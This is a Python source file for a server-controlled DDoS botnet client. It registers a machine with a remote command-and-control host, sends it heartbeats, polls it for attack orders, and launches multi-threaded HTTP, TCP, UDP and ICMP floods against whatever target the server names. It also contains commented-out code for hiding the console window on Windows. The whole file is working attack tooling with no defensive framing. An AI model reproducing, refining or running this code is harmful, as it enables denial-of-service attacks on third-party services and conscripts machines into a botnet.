#!/usr/bin/env python3
"""
DDoS Auto Bot - Server Controlled
No CLI needed - Just run and it connects to server
Waits for commands from web panel
"""
import requests
import threading
import time
import socket
import random
import subprocess
import platform
import sys
import urllib3
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
import os

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
# CONFIGURATION - EDIT THIS!
# ============================================
CONTROL_SERVER = "https://c2-server-io.onrender.com"  # Your server URL
SERVER_PASSWORD = "admin123"                  # Match server password
# ============================================

class DDoSBot:
    def __init__(self):
        self.server_url = CONTROL_SERVER.rstrip('/')
        self.password = SERVER_PASSWORD
        self.node_id = None
        self.registered = False
        
        # Attack state
        self.attacking = False
        self.running = True
        self.request_count = 0
        self.success_count = 0
        self.attack_start_time = None
        self.lock = threading.Lock()
        
        # Attack parameters
        self.target = None
        self.method = None
        self.threads = 0
        self.duration = 0
        self.target_host = None
        self.target_port = None
        
    def get_system_info(self):
        """Get system information"""
        try:
            return {
                'hostname': socket.gethostname(),
                'os': platform.system(),
                'os_version': platform.version(),
                'machine': platform.machine(),
                'location': 'Unknown',
                'max_threads': 500
            }
        except:
            return {
                'hostname': socket.gethostname(),
                'os': platform.system(),
                'location': 'Unknown'
            }
    
    def register(self):
        """Register with control server"""
        try:
            info = self.get_system_info()
            
            response = requests.post(
                f"{self.server_url}/api/register",
                json={'info': info},
                timeout=10,
                verify=False
            )
            
            data = response.json()
            if data.get('success'):
                self.node_id = data.get('node_id')
                self.registered = True
                return True
            
            return False
        except:
            return False
    
    def send_heartbeat(self):
        """Send heartbeat to server"""
        try:
            if not self.node_id:
                return
            
            requests.post(
                f"{self.server_url}/api/heartbeat",
                json={
                    'node_id': self.node_id,
                    'stats': {
                        'requests_sent': self.request_count,
                        'requests_successful': self.success_count
                    }
                },
                timeout=5,
                verify=False
            )
        except:
            pass
    
    def get_command(self):
        """Get attack command from server"""
        try:
            if not self.node_id:
                return None
            
            response = requests.get(
                f"{self.server_url}/api/command",
                params={'node_id': self.node_id},
                timeout=10,
                verify=False
            )
            
            data = response.json()
            if data.get('success'):
                return data
            
            return None
        except:
            return None
    
    def parse_target(self, target, method):
        """Parse target for different methods"""
        if method in ["tcp", "udp"]:
            if ":" in target:
                host, port = target.split(":", 1)
                try:
                    port = int(port)
                except:
                    port = 80 if method == "tcp" else 53
            else:
                host = target
                port = 80 if method == "tcp" else 53
            return host, port
        elif method == "icmp":
            if "://" in target:
                parsed = urlparse(target)
                target = parsed.netloc or parsed.path
                if ":" in target:
                    target = target.split(":")[0]
            return target, None
        else:  # http
            if not target.startswith(('http://', 'https://')):
                target = f"http://{target}"
            return target, None
    
    def get_random_user_agent(self):
        """Get random user agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        return random.choice(user_agents)
    
    def http_attack(self, target):
        """HTTP flood attack"""
        try:
            headers = {
                'User-Agent': self.get_random_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive'
            }
            
            params = {
                '_': str(int(time.time() * 1000)),
                'id': str(random.randint(1, 1000000))
            }
            
            response = requests.get(target, headers=headers, params=params, timeout=5, verify=False)
            success = response.status_code < 500
            
            with self.lock:
                self.request_count += 1
                if success:
                    self.success_count += 1
        except:
            with self.lock:
                self.request_count += 1
    
    def tcp_attack(self, host, port):
        """TCP flood attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((host, port))
            
            if result == 0:
                sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                with self.lock:
                    self.success_count += 1
            
            sock.close()
            with self.lock:
                self.request_count += 1
        except:
            with self.lock:
                self.request_count += 1
    
    def udp_attack(self, host, port):
        """UDP flood attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = os.urandom(random.randint(512, 2048))
            sock.sendto(payload, (host, port))
            sock.close()
            
            with self.lock:
                self.request_count += 1
                self.success_count += 1
        except:
            with self.lock:
                self.request_count += 1
    
    def icmp_attack(self, host):
        """ICMP flood attack"""
        try:
            system = platform.system().lower()
            
            if system == "windows":
                cmd = f"ping -n 1 -w 1000 {host}"
            else:
                cmd = f"ping -c 1 -W 1 {host}"
            
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=2)
            
            with self.lock:
                self.request_count += 1
                if result.returncode == 0:
                    self.success_count += 1
        except:
            with self.lock:
                self.request_count += 1
    
    def attack_worker(self):
        """Worker thread for attacks"""
        start_time = time.time()
        
        while self.attacking and (time.time() - start_time) < self.duration:
            try:
                if self.method == 'http':
                    self.http_attack(self.target_host)
                elif self.method == 'tcp':
                    self.tcp_attack(self.target_host, self.target_port)
                elif self.method == 'udp':
                    self.udp_attack(self.target_host, self.target_port)
                elif self.method == 'icmp':
                    self.icmp_attack(self.target_host)
                
                time.sleep(0.01)
            except:
                continue
    
    def start_attack(self, attack_data):
        """Start attack based on server command"""
        if self.attacking:
            return
        
        self.target = attack_data.get('target')
        self.method = attack_data.get('method', 'http')
        self.threads = attack_data.get('threads', 80)
        self.duration = attack_data.get('duration', 60)
        
        # Parse target
        self.target_host, self.target_port = self.parse_target(self.target, self.method)
        if self.method == 'http':
            self.target_host = self.target  # Keep full URL for HTTP
        
        print(f"\n🚀 ATTACK STARTED")
        print(f"   Target: {self.target}")
        print(f"   Method: {self.method.upper()}")
        print(f"   Threads: {self.threads}")
        print(f"   Duration: {self.duration}s\n")
        
        # Reset stats
        with self.lock:
            self.request_count = 0
            self.success_count = 0
        
        self.attacking = True
        self.attack_start_time = time.time()
        
        # Start attack threads
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.attack_worker) for _ in range(self.threads)]
            
            # Monitor attack
            self.monitor_attack()
    
    def stop_attack(self):
        """Stop current attack"""
        if not self.attacking:
            return
        
        print(f"\n\n🛑 ATTACK STOPPED BY SERVER")
        
        self.attacking = False
        
        # Wait a moment for threads to finish
        time.sleep(0.5)
        
        elapsed = time.time() - self.attack_start_time if self.attack_start_time else 0
        
        print(f"\n📊 ATTACK SUMMARY")
        print(f"   Duration: {elapsed:.1f}s")
        print(f"   Total Requests: {self.request_count:,}")
        print(f"   Successful: {self.success_count:,}")
        
        if self.request_count > 0:
            success_rate = (self.success_count / self.request_count * 100)
            print(f"   Success Rate: {success_rate:.1f}%")
        
        if elapsed > 0:
            avg_rps = self.request_count / elapsed
            print(f"   Average RPS: {avg_rps:.1f}")
        
        print(f"\n⏳ Waiting for next command...\n")
    
    def monitor_attack(self):
        """Monitor attack progress and check for stop commands"""
        last_count = 0
        
        while self.attacking and (time.time() - self.attack_start_time) < self.duration:
            time.sleep(1)
            
            # Check for stop command from server every second
            try:
                command_data = self.get_command()
                if command_data and command_data.get('command') == 'idle':
                    # Server sent stop command
                    self.stop_attack()
                    return
            except:
                pass
            
            elapsed = time.time() - self.attack_start_time
            current_count = self.request_count
            rps = current_count - last_count
            success_rate = (self.success_count / current_count * 100) if current_count > 0 else 0
            
            sys.stdout.write(f"\r⚡ Requests: {current_count:,} | RPS: {rps} | Success: {success_rate:.1f}% | Time: {elapsed:.1f}s")
            sys.stdout.flush()
            
            last_count = current_count
        
        # Attack finished naturally (duration completed)
        if self.attacking:
            self.attacking = False
            elapsed = time.time() - self.attack_start_time
            
            print(f"\n\n✅ ATTACK COMPLETED")
            print(f"   Duration: {elapsed:.1f}s")
            print(f"   Total Requests: {self.request_count:,}")
            print(f"   Successful: {self.success_count:,}")
            print(f"   Average RPS: {(self.request_count/elapsed):.1f}" if elapsed > 0 else "0")
            print(f"\n⏳ Waiting for next command...\n")
    
    def run(self):
        """Main bot loop"""
        print(f"""
\033[38;5;46m
╔══════════════════════════════════════════════════╗
║         DDoS BOT - AUTO MODE                     ║
╚══════════════════════════════════════════════════╝
\033[0m
Server: {self.server_url}
System: {platform.system()} - {socket.gethostname()}
""")
        
        print("🔄 Connecting to control server...\n")
        
        while self.running:
            try:
                # Register if not registered
                if not self.registered:
                    if self.register():
                        print(f"✅ Connected to server")
                        print(f"   Node ID: {self.node_id}")
                        print(f"\n🟢 BOT ONLINE - Waiting for commands...\n")
                    else:
                        print("❌ Connection failed, retrying in 10s...")
                        time.sleep(10)
                        continue
                
                # Send heartbeat
                self.send_heartbeat()
                
                # Get command from server
                command_data = self.get_command()
                
                if command_data:
                    command = command_data.get('command')
                    
                    if command == 'attack':
                        attack_info = command_data.get('data', {})
                        if not self.attacking:
                            self.start_attack(attack_info)
                    
                    elif command == 'idle':
                        if self.attacking:
                            self.stop_attack()
                
                # Wait before next check
                time.sleep(5)
                
            except KeyboardInterrupt:
                print("\n\n🛑 Bot shutting down...")
                if self.attacking:
                    self.stop_attack()
                break
                
            except Exception as e:
                print(f"\n❌ Error: {e}")
                time.sleep(10)
                self.registered = False

def main():
    """Main function"""
    # Hide console on Windows (optional)
    # if sys.platform == 'win32':
    #     try:
    #         import ctypes
    #         ctypes.windll.user32.ShowWindow(
    #             ctypes.windll.kernel32.GetConsoleWindow(), 0
    #         )
    #     except:
    #         pass
    
    print("""
\033[38;5;46m
    ██████╗  ██████╗ ████████╗
    ██╔══██╗██╔═══██╗╚══██╔══╝
    ██████╔╝██║   ██║   ██║   
    ██╔══██╗██║   ██║   ██║   
    ██████╔╝╚██████╔╝   ██║   
    ╚═════╝  ╚═════╝    ╚═╝   
                               
    [DDoS Bot - Server Controlled]
    [No CLI Arguments Needed]
\033[0m
    """)
    
    # Check configuration
    if CONTROL_SERVER in ["http://localhost:5000", "http://127.0.0.1:5000", "https://c2-server-io.onrender.com"]:
        print("\n⚠️ WARNING: Default server URL detected!")
        print(f"   Current: {CONTROL_SERVER}")
        print("   Edit CONTROL_SERVER at top of file\n")
    
    # Create and run bot
    bot = DDoSBot()
    bot.run()

if __name__ == "__main__":
    main()
